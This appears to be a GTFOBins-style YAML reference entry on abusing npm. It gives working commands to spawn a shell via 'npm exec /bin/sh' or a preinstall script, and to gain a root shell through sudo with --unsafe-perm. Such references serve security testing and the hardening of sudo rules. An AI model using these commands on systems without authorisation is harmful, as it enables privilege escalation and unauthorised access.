---
functions:
  shell:
    - code: npm exec /bin/sh
    - description: Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`.
      code: |
        TF=$(mktemp -d)
        echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
        npm -C $TF i
  sudo:
    - description: Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`.
      code: |
        TF=$(mktemp -d)
        echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
        sudo npm -C $TF --unsafe-perm i
---
